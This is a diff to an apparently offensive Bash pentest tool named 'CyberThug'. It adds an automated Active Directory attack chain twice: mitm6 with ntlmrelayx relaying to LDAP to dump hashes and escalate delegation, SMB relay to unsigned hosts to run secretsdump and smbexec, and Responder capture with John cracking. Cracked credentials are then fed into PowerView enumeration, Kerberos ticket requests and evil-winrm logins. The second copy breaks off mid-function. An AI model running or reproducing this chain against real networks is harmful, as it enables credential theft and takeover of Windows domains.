@@ -1,5 +1,4 @@
-
-#!/bin/bash 
+#!/bin/bash
 ########################################
 ####  [+]-- Author: 0x2034   --[+]  ####
 ####   [+]--   CyberThug    --[+]   ####
@@ -1949,6 +1948,367 @@ echo ''
 exec bash
 "
             echo ""
+ntlmrelay_mitm6(){
+gnome-terminal -- bash -c "
+echo -e '\033[36m[+]-- Running Mitm6 Attack --[+]\033[0m'
+echo ''
+
+DOMAIN=\"'$DOMAIN'\"
+DATE=\"'$DATE'\"
+Ip=\"'$p'\"
+CLEAN_DOMAIN=\"'$CLEAN_DOMAIN'\"
+Kerberos=\"'$Kerberos'\"
+DC=\"'$DC'\"
+
+interfaces=()
+while IFS= read -r line; do
+    interfaces+=(\"\$line\")
+done < <(ip -4 -o addr show up | awk '{print \$2\":\"\$4}' | sed 's#/.*##')
+
+echo -e '\n[*] Available interfaces:'
+echo ''
+for i in \"\${!interfaces[@]}\"; do
+    echo \"  [\$i] \${interfaces[\$i]}\"
+done
+echo ''
+read -p 'Enter the number of the interface to use for Responder: ' index
+interface=\$(echo \"\${interfaces[\$index]}\" | cut -d':' -f1 | xargs)
+echo ''
+echo -e \"[*] You selected interface: \$interface\"
+
+gnome-terminal -- bash -c '
+echo \"\"
+read -p \"Do you need to escalate a user? (y/n): \" ans
+echo \"\"
+if [[ \$ans == \"Y\" || \$ans == \"y\" ]]; then
+    read -p \"Enter the User to escalate: \" U
+    read -p \"Enter the user'\''s password: \" P
+fi
+
+if [[ -z \"\$U\" ]]; then
+    esc_user=\"\"
+else
+    esc_user=\"--escalate-user \$U --delegate-access\"
+fi
+
+echo \"\"
+echo -e \"\n1) ldap\n2) ldaps\n\"
+echo \"\"
+read -p \"Choose (1 or 2): \" ch
+echo \"\"
+if [[ \$ch == \"1\" ]]; then
+    ch1=\"ldap\"
+else
+    ch1=\"ldaps\"
+fi
+
+rand=\$((RANDOM))
+
+impacket-ntlmrelayx -6 -wh internal-\$rand.'"$DOMAIN"' -t \$ch1://$DC -l mitm6_loot_'"$DOMAIN"'_'"$DATE"' --no-smb-server --add-computer --dump-hashes \$esc_user 2>&1 | \\
+while IFS= read -r line; do
+    echo \"\$line\"
+
+    if [[ \"\$line\" =~ ([a-zA-Z0-9._-]+)\ can\ now\ impersonate\ users\ on\ ([A-Z0-9\\\\._\\\$-]+) ]]; then
+        esc_user_name=\"\${BASH_REMATCH[1]}\"
+        esc_computer_raw=\"\${BASH_REMATCH[2]}\"
+        esc_computer=\$(echo \"\$esc_computer_raw\" | sed \"s/.*\\\\\\\\//\" | sed \"s/\\\$//\")
+	c_computer=\${esc_computer%\$}        
+	ip_c=\$(ping -c 1 \"\$c_computer\" 2>/dev/null | sed -n \"s/^PING[^(]*(\\([0-9.]*\\)).*/\\1/p\")
+        if [ -z \"\$ip_c\" ]; then
+	   echo \" ** Add \$c_computer to /etc/hosts \"	
+	else        
+           gnome-terminal -- bash -c \"impacket-secretsdump \$esc_computer/\$esc_user_name:\$P@\$ip_c ; exec bash\"
+        fi
+    fi
+done
+cp -r mitm6_loot_'"$DOMAIN"'* $HOME/CyberThug_output/cyberthug_-t_output/'"$DOMAIN"'
+exec bash
+'
+gnome-terminal -- bash -c \"sudo mitm6 -i \$interface -d $DOMAIN; exec bash\"
+
+exec bash
+"
+sleep 5
+gnome-terminal -- bash -c '
+echo -e "\033[36m[+]-- Running SMBRelayAttack --[+]\033[0m"
+echo ""
+DOMAIN="'"$DOMAIN"'"
+DATE="'"$DATE"'"
+Ip="'"$p"'"
+CLEAN_DOMAIN="'"$CLEAN_DOMAIN"'"
+Kerberos="'"$Kerberos"'"
+DC="'"$DC"'"
+
+nxc smb $DOMAIN | grep "signing:" | awk "{print \$16}" | tr -d ")" | sed "s/(signing://" > /tmp/smb_signing
+signing_status=$(cat /tmp/smb_signing) 
+
+if [[ "$signing_status" == "False" || "$signing_status" == "false" ]]; then
+    nxc smb $DOMAIN | grep "(signing:False)" | awk "{print \$2}" > /tmp/targets.txt
+    interfaces=()
+    while IFS= read -r line; do
+        interfaces+=("$line")
+    done < <(ip -4 -o addr show up | awk "{print \$2 \":\" \$4}" | sed "s#/.*##")
+    echo -e "\n[*] Available interfaces:"
+    echo ""
+    for i in "${!interfaces[@]}"; do
+        echo "  [$i] ${interfaces[$i]}"
+    done
+    echo ""
+    read -p "Enter the number of the interface to use for Responder: " index
+    interface=$(echo "${interfaces[$index]}" | cut -d":" -f1 | xargs)
+    echo "[*] You selected interface: $interface"
+    echo ""
+    echo -e "\033[36m[*] Disabling SMB and HTTP servers in Responder config \033[0m"
+    sudo sed -i "/^SMB *=/ c\\SMB     = off" /etc/responder/Responder.conf
+    sudo sed -i "/^HTTP *=/ c\\HTTP    = off" /etc/responder/Responder.conf
+    echo -e "\033[36m[*] Current Responder config (SMB/HTTP): \033[0m"
+    echo ""
+    grep -E --color=always "^(SMB|HTTP) *=.*" /etc/responder/Responder.conf
+    echo
+    echo -e "\033[36m[*] Starting Responder in background \033[0m"
+    echo "" 
+    gnome-terminal -- bash -c "sudo responder -I $interface ; exec bash"
+    echo ""
+    echo -e "\033[36m[*] Starting ntlmrelayx with expect script \033[0m"
+    echo ""
+    target=$(cat /tmp/targets.txt)
+    expect << EOD
+      log_user 1
+      sleep 8
+      spawn impacket-ntlmrelayx -tf /tmp/targets.txt -of SAMhashes -smb2support -socks --keep-relaying --no-http-server  --no-wcf-server --no-raw-server
+      set targets {}
+      expect {
+         eof { exit }
+
+         -re "ntlmrelayx>" {
+            sleep 10
+            send "socks\r"
+            exp_continue
+         }
+
+         -re {\s*SMB\s+(\S+)\s+(\S+)\s+(TRUE|FALSE)\s+445} {
+            set Username \$expect_out(2,string)
+            if {[lsearch \$targets \$Username] == -1} {
+                lappend targets \$Username 
+                exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; cp SAMhashes_ntlmv2 $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/SAMhashes_smbrelay_ntlmv2_$DATE 2>/dev/null ; cp SAMhashes_ntlm $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/SAMhashes_smbrelay_ntlm_$DATE 2>/dev/null ; sleep 2 ; proxychains -q impacket-smbexec -no-pass \$Username@$target -debug ; exec bash"
+                exec gnome-terminal -- bash -c "sleep 5 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q impacket-secretsdump -no-pass \$Username@$target -debug ; exec bash" 
+		exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q impacket-smbclient -no-pass \$Username@$target ; exec bash"
+            }    
+            exp_continue
+           }
+         }
+EOD
+else
+    echo -e "\033[36m[!] SMB signing is enabled. No action taken \033[0m"
+    echo ""
+    echo -e "\033[36m===================================================\033[0m"
+    echo ""
+    interfaces=()
+    while IFS= read -r line; do
+        interfaces+=("$line")
+    done < <(ip -4 -o addr show up | awk "{print \$2 \":\" \$4}" | sed "s#/.*##")
+    echo -e "\n[*] Available interfaces:"
+    echo ""
+    for i in "${!interfaces[@]}"; do
+        echo "  [$i] ${interfaces[$i]}"
+    done
+    echo ""
+    read -p "Enter the number of the interface to use for Responder: " index
+    interface=$(echo "${interfaces[$index]}" | cut -d":" -f1 | xargs)
+    echo "[*] You selected interface: $interface"
+    echo ""
+    echo -e "\033[36m[*] Disabling SMB and HTTP servers in Responder config \033[0m"
+    sudo sed -i "/^SMB *=/ c\\SMB     = On" /etc/responder/Responder.conf
+    sudo sed -i "/^HTTP *=/ c\\HTTP    = On" /etc/responder/Responder.conf
+    echo -e "\033[36m[*] Current Responder config (SMB/HTTP): \033[0m"
+    echo ""
+    grep -E --color=always "^(SMB|HTTP) *=.*" /etc/responder/Responder.conf
+    echo ""
+    gnome-terminal -- bash -c "echo '====================' ; echo Running Responder ; echo '====================' ; echo '' ; sudo responder -I $interface ; exec bash"
+LOG_DIR="/usr/share/responder/logs"
+JOHN_INPUT="/tmp/responder_john_input.txt"
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+CRACKED_TRACKER="$HOME/.cracked_hashes.txt"
+JOHN_OUTPUT="/tmp/john_cracked.txt"
+
+echo "[*] Monitoring Responder logs and cracking NEW hashes with John ..."
+touch "$CRACKED_TRACKER"
+echo ""
+
+while true; do
+    > "$JOHN_INPUT"
+    grep -h "NTLMv2-SSP Hash" "$LOG_DIR"/* 2>/dev/null | \
+    awk -F "Hash     : " '"'"'{print $2}'"'"' | sort -u | while read -r hash; do
+        if ! grep -qF "$hash" "$CRACKED_TRACKER"; then
+            echo "$hash" >> "$JOHN_INPUT"
+            echo "" 
+            echo "$hash" >> "$CRACKED_TRACKER"
+        fi
+    done
+
+    if [[ -s "$JOHN_INPUT" ]]; then
+        echo "[+] New hashes found! Running John..."
+        john --format=netntlmv2 "$JOHN_INPUT" --wordlist="$WORDLIST" > /dev/null
+        john --show --format=netntlmv2 "$JOHN_INPUT" > "$JOHN_OUTPUT"
+        echo "[*] Cracked credentials:"
+        echo "" 
+        cat "$JOHN_OUTPUT"
+        echo ""
+
+        awk -F: '"'"'$2 && $2 !~ /^[A-F0-9]{32,}$/ {user=$1; pass=$2; print user, pass}'"'"' "$JOHN_OUTPUT" | while read -r user p; do
+            echo ""
+            gnome-terminal -- bash -c "
+echo '=========================================' 
+echo  Launching Gnomes For $user with $p
+echo '=========================================' 
+echo '' 
+for i in {1..15}; do
+    dots=\$(( (i - 1) % 3 + 1 ))
+    echo -ne \"\r\033[36mLoading\$(printf \"%-\${dots}s\" | tr \" \" \".\")\033[0m\"
+    sleep 0.3
+done
+echo ''
+gnome-terminal -- expect -c \"
+spawn s -t
+send \\\"0\\r$CLEAN_DOMAIN\\r$user\\r$p\\r$Ip\\r$DC\\r$Kerberos\\r\\\"
+interact
+\"
+gnome-terminal -- bash -c \"
+echo -e \\\"\\\e[1;32m[+] User: $user \e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Password: $p \e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] DC: $DC \e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Domain: $DOMAIN  \e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Trying powerview direct auth for $user  ...\e[0m\\\"
+echo ''
+echo -e \\\"\\\e[1;32m[+]-- Running powerview $CLEAN_DOMAIN/$user:$p@$DC --[+]\e[0m\\\"
+echo ''
+expect -c \\\"set timeout -1
+set send_slow {1 .001}
+spawn powerview $CLEAN_DOMAIN/$user:$p@$DC
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
+interact\\\"
+echo ''
+echo -e \\\"\\\e[1;32m[+] Getting TGT for $user ...\e[0m\\\"
+echo ''
+getTGT.py $CLEAN_DOMAIN/$user:$p -dc-ip $Ip -k
+export KRB5CCNAME=$user.ccache
+echo ''
+echo -e \\\"\\\e[1;32m[+]-- powerview $CLEAN_DOMAIN/$user:$p@$DC -k --[+]\e[0m\\\"
+echo ''
+expect -c \\\"set timeout -1
+set send_slow {1 .001}
+spawn powerview $CLEAN_DOMAIN/$user:$p@$DC -k
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
+interact\\\"
+echo ''
+echo -e \\\"\\\e[1;33m[!] powerview failed for $user again with ticket\e[0m\\\"
+exec bash\"  
+gnome-terminal -- bash -c \"
+echo -e \\\"\\\e[1;32m[+] User: $user\e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Password: $p\e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] DC: $DC\e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Domain: $CLEAN_DOMAIN\e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Ip: $Ip\e[0m\\\"
+
+echo -e \\\"\\\e[1;32m[+] Trying Evil-WinRM direct auth for $user ...\e[0m\\\"
+echo '' 
+echo -e \\\"\\\e[1;34m[+]-- Running evil-winrm -i $DC -u $user -p $p --[+]\e[0m\\\"
+echo ''
+evil-winrm -i $DC -u $user -p $p
+
+if [ \$? -ne 1 ]; then
+    echo ''
+    echo -e \\\"\\\e[1;33m[!] Evil-WinRM failed for $user. Trying getTGT.py and Kerberos auth ..\e[0m\\\"
+    echo ''
+
+    getTGT.py $CLEAN_DOMAIN/$user:$p -dc-ip $Ip -k
+    echo ''
+
+    if [ -f $user.ccache ]; then
+        export KRB5CCNAME=$user.ccache
+        echo ''
+        echo -e \\\"\\\e[1;34m[+]-- Running evil-winrm -i $DC -u $user -r $CLEAN_DOMAIN --[+]\e[0m\\\"
+        echo ''   
+        evil-winrm -i $DC -u $user -r $CLEAN_DOMAIN
+        if [ \$? -ne 0 ]; then
+            echo ''
+            echo -e \\\"\\\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m\\\"
+            echo ''
+        fi
+    else
+        echo -e \\\"\\\e[1;31m[-] getTGT.py failed. No ccache found for $user.\e[0m\\\"
+        echo ''
+    fi
+fi
+exec bash\"
+
+exec bash
+"
+        done
+    fi
+    sleep 5
+done
+    echo ""
+fi  
+exec bash
+'
+}
+            ntlmrelay_mitm6      
+ 	    echo ""
             echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password --continue-on-success $flag --[+]\033[0m"
             echo ""
             nxc smb $DOMAIN -u $User -p $Password --continue-on-success $flag
@@ -5523,6 +5883,367 @@ if [[ "$flag_7" = true ]]; then
     echo ""
     echo -e "\033[36m[+] Configuring /etc/krb5.conf ... \033[0m" 
     echo ""
+ntlmrelay_mitm6(){
+gnome-terminal -- bash -c "
+echo -e '\033[36m[+]-- Running Mitm6 Attack --[+]\033[0m'
+echo ''
+
+DOMAIN=\"'$DOMAIN'\"
+DATE=\"'$DATE'\"
+Ip=\"'$Ip'\"
+CLEAN_DOMAIN=\"'$CLEAN_DOMAIN'\"
+Kerberos=\"'$Kerberos'\"
+DC=\"'$DC'\"
+
+interfaces=()
+while IFS= read -r line; do
+    interfaces+=(\"\$line\")
+done < <(ip -4 -o addr show up | awk '{print \$2\":\"\$4}' | sed 's#/.*##')
+
+echo -e '\n[*] Available interfaces:'
+echo ''
+for i in \"\${!interfaces[@]}\"; do
+    echo \"  [\$i] \${interfaces[\$i]}\"
+done
+echo ''
+read -p 'Enter the number of the interface to use for Responder: ' index
+interface=\$(echo \"\${interfaces[\$index]}\" | cut -d':' -f1 | xargs)
+echo ''
+echo -e \"[*] You selected interface: \$interface\"
+
+gnome-terminal -- bash -c '
+echo \"\"
+read -p \"Do you need to escalate a user? (y/n): \" ans
+echo \"\"
+if [[ \$ans == \"Y\" || \$ans == \"y\" ]]; then
+    read -p \"Enter the User to escalate: \" U
+    read -p \"Enter the user'\''s password: \" P
+fi
+
+if [[ -z \"\$U\" ]]; then
+    esc_user=\"\"
+else
+    esc_user=\"--escalate-user \$U --delegate-access\"
+fi
+
+echo \"\"
+echo -e \"\n1) ldap\n2) ldaps\n\"
+echo \"\"
+read -p \"Choose (1 or 2): \" ch
+echo \"\"
+if [[ \$ch == \"1\" ]]; then
+    ch1=\"ldap\"
+else
+    ch1=\"ldaps\"
+fi
+
+rand=\$((RANDOM))
+
+impacket-ntlmrelayx -6 -wh internal-\$rand.'"$DOMAIN"' -t \$ch1://$DC -l mitm6_loot_'"$DOMAIN"'_'"$DATE"' --no-smb-server --add-computer --dump-hashes \$esc_user 2>&1 | \\
+while IFS= read -r line; do
+    echo \"\$line\"
+
+    if [[ \"\$line\" =~ ([a-zA-Z0-9._-]+)\ can\ now\ impersonate\ users\ on\ ([A-Z0-9\\\\._\\\$-]+) ]]; then
+        esc_user_name=\"\${BASH_REMATCH[1]}\"
+        esc_computer_raw=\"\${BASH_REMATCH[2]}\"
+        esc_computer=\$(echo \"\$esc_computer_raw\" | sed \"s/.*\\\\\\\\//\" | sed \"s/\\\$//\")
+	c_computer=\${esc_computer%\$}        
+	ip_c=\$(ping -c 1 \"\$c_computer\" 2>/dev/null | sed -n \"s/^PING[^(]*(\\([0-9.]*\\)).*/\\1/p\")
+        if [ -z \"\$ip_c\" ]; then
+	   echo \" ** Add \$c_computer to /etc/hosts \"	
+	else        
+           gnome-terminal -- bash -c \"impacket-secretsdump \$esc_computer/\$esc_user_name:\$P@\$ip_c ; exec bash\"
+        fi
+    fi
+done
+cp -r mitm6_loot_'"$DOMAIN"'* $HOME/CyberThug_output/cyberthug_--creds_output/'"$DOMAIN"'
+exec bash
+'
+gnome-terminal -- bash -c \"sudo mitm6 -i \$interface -d $DOMAIN; exec bash\"
+
+exec bash
+"
+sleep 5
+gnome-terminal -- bash -c '
+echo -e "\033[36m[+]-- Running SMBRelayAttack --[+]\033[0m"
+echo ""
+DOMAIN="'"$DOMAIN"'"
+DATE="'"$DATE"'"
+Ip="'"$Ip"'"
+CLEAN_DOMAIN="'"$CLEAN_DOMAIN"'"
+Kerberos="'"$Kerberos"'"
+DC="'"$DC"'"
+
+nxc smb $DOMAIN | grep "signing:" | awk "{print \$16}" | tr -d ")" | sed "s/(signing://" > /tmp/smb_signing
+signing_status=$(cat /tmp/smb_signing) 
+
+if [[ "$signing_status" == "False" || "$signing_status" == "false" ]]; then
+    nxc smb $DOMAIN | grep "(signing:False)" | awk "{print \$2}" > /tmp/targets_creds.txt
+    interfaces=()
+    while IFS= read -r line; do
+        interfaces+=("$line")
+    done < <(ip -4 -o addr show up | awk "{print \$2 \":\" \$4}" | sed "s#/.*##")
+    echo -e "\n[*] Available interfaces:"
+    echo ""
+    for i in "${!interfaces[@]}"; do
+        echo "  [$i] ${interfaces[$i]}"
+    done
+    echo ""
+    read -p "Enter the number of the interface to use for Responder: " index
+    interface=$(echo "${interfaces[$index]}" | cut -d":" -f1 | xargs)
+    echo "[*] You selected interface: $interface"
+    echo ""
+    echo -e "\033[36m[*] Disabling SMB and HTTP servers in Responder config \033[0m"
+    sudo sed -i "/^SMB *=/ c\\SMB     = off" /etc/responder/Responder.conf
+    sudo sed -i "/^HTTP *=/ c\\HTTP    = off" /etc/responder/Responder.conf
+    echo -e "\033[36m[*] Current Responder config (SMB/HTTP): \033[0m"
+    echo ""
+    grep -E --color=always "^(SMB|HTTP) *=.*" /etc/responder/Responder.conf
+    echo
+    echo -e "\033[36m[*] Starting Responder in background \033[0m"
+    echo "" 
+    gnome-terminal -- bash -c "sudo responder -I $interface ; exec bash"
+    echo ""
+    echo -e "\033[36m[*] Starting ntlmrelayx with expect script \033[0m"
+    echo ""
+    target=$(cat /tmp/targets_creds.txt)
+    expect << EOD
+      log_user 1
+      sleep 8
+      spawn impacket-ntlmrelayx -tf /tmp/targets_creds.txt -of SAMhashes -smb2support -socks --keep-relaying --no-http-server  --no-wcf-server --no-raw-server
+      set targets {}
+      expect {
+         eof { exit }
+
+         -re "ntlmrelayx>" {
+            sleep 10
+            send "socks\r"
+            exp_continue
+         }
+
+         -re {\s*SMB\s+(\S+)\s+(\S+)\s+(TRUE|FALSE)\s+445} {
+            set Username \$expect_out(2,string)
+            if {[lsearch \$targets \$Username] == -1} {
+                lappend targets \$Username 
+                exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; cp SAMhashes_ntlmv2 $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/SAMhashes_smbrelay_ntlmv2_$DATE 2>/dev/null ; cp SAMhashes_ntlm $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/SAMhashes_smbrelay_ntlm_$DATE 2>/dev/null ; sleep 2 ; proxychains -q impacket-smbexec -no-pass \$Username@$target -debug ; exec bash"
+                exec gnome-terminal -- bash -c "sleep 5 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q impacket-secretsdump -no-pass \$Username@$target -debug ; exec bash" 
+		exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q impacket-smbclient -no-pass \$Username@$target ; exec bash"
+            }    
+            exp_continue
+           }
+         }
+EOD
+else
+    echo -e "\033[36m[!] SMB signing is enabled. No action taken \033[0m"
+    echo ""
+    echo -e "\033[36m===================================================\033[0m"
+    echo ""
+    interfaces=()
+    while IFS= read -r line; do
+        interfaces+=("$line")
+    done < <(ip -4 -o addr show up | awk "{print \$2 \":\" \$4}" | sed "s#/.*##")
+    echo -e "\n[*] Available interfaces:"
+    echo ""
+    for i in "${!interfaces[@]}"; do
+        echo "  [$i] ${interfaces[$i]}"
+    done
+    echo ""
+    read -p "Enter the number of the interface to use for Responder: " index
+    interface=$(echo "${interfaces[$index]}" | cut -d":" -f1 | xargs)
+    echo "[*] You selected interface: $interface"
+    echo ""
+    echo -e "\033[36m[*] Disabling SMB and HTTP servers in Responder config \033[0m"
+    sudo sed -i "/^SMB *=/ c\\SMB     = On" /etc/responder/Responder.conf
+    sudo sed -i "/^HTTP *=/ c\\HTTP    = On" /etc/responder/Responder.conf
+    echo -e "\033[36m[*] Current Responder config (SMB/HTTP): \033[0m"
+    echo ""
+    grep -E --color=always "^(SMB|HTTP) *=.*" /etc/responder/Responder.conf
+    echo ""
+    gnome-terminal -- bash -c "echo '====================' ; echo Running Responder ; echo '====================' ; echo '' ; sudo responder -I $interface ; exec bash"
+LOG_DIR="/usr/share/responder/logs"
+JOHN_INPUT="/tmp/responder_john_input.txt"
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+CRACKED_TRACKER="$HOME/.cracked_hashes.txt"
+JOHN_OUTPUT="/tmp/john_cracked.txt"
+
+echo "[*] Monitoring Responder logs and cracking NEW hashes with John ..."
+touch "$CRACKED_TRACKER"
+echo ""
+
+while true; do
+    > "$JOHN_INPUT"
+    grep -h "NTLMv2-SSP Hash" "$LOG_DIR"/* 2>/dev/null | \
+    awk -F "Hash     : " '"'"'{print $2}'"'"' | sort -u | while read -r hash; do
+        if ! grep -qF "$hash" "$CRACKED_TRACKER"; then
+            echo "$hash" >> "$JOHN_INPUT"
+            echo "" 
+            echo "$hash" >> "$CRACKED_TRACKER"
+        fi
+    done
+
+    if [[ -s "$JOHN_INPUT" ]]; then
+        echo "[+] New hashes found! Running John..."
+        john --format=netntlmv2 "$JOHN_INPUT" --wordlist="$WORDLIST" > /dev/null
+        john --show --format=netntlmv2 "$JOHN_INPUT" > "$JOHN_OUTPUT"
+        echo "[*] Cracked credentials:"
+        echo "" 
+        cat "$JOHN_OUTPUT"
+        echo ""
+
+        awk -F: '"'"'$2 && $2 !~ /^[A-F0-9]{32,}$/ {user=$1; pass=$2; print user, pass}'"'"' "$JOHN_OUTPUT" | while read -r user p; do
+            echo ""
+            gnome-terminal -- bash -c "
+echo '=========================================' 
+echo  Launching Gnomes For $user with $p
+echo '=========================================' 
+echo '' 
+for i in {1..15}; do
+    dots=\$(( (i - 1) % 3 + 1 ))
+    echo -ne \"\r\033[36mLoading\$(printf \"%-\${dots}s\" | tr \" \" \".\")\033[0m\"
+    sleep 0.3
+done
+echo ''
+gnome-terminal -- expect -c \"
+spawn s -t
+send \\\"0\\r$CLEAN_DOMAIN\\r$user\\r$p\\r$Ip\\r$DC\\r$Kerberos\\r\\\"
+interact
+\"
+gnome-terminal -- bash -c \"
+echo -e \\\"\\\e[1;32m[+] User: $user \e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Password: $p \e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] DC: $DC \e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Domain: $DOMAIN  \e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Trying powerview direct auth for $user  ...\e[0m\\\"
+echo ''
+echo -e \\\"\\\e[1;32m[+]-- Running powerview $CLEAN_DOMAIN/$user:$p@$DC --[+]\e[0m\\\"
+echo ''
+expect -c \\\"set timeout -1
+set send_slow {1 .001}
+spawn powerview $CLEAN_DOMAIN/$user:$p@$DC
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
+interact\\\"
+echo ''
+echo -e \\\"\\\e[1;32m[+] Getting TGT for $user ...\e[0m\\\"
+echo ''
+getTGT.py $CLEAN_DOMAIN/$user:$p -dc-ip $Ip -k
+export KRB5CCNAME=$user.ccache
+echo ''
+echo -e \\\"\\\e[1;32m[+]-- powerview $CLEAN_DOMAIN/$user:$p@$DC -k --[+]\e[0m\\\"
+echo ''
+expect -c \\\"set timeout -1
+set send_slow {1 .001}
+spawn powerview $CLEAN_DOMAIN/$user:$p@$DC -k
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
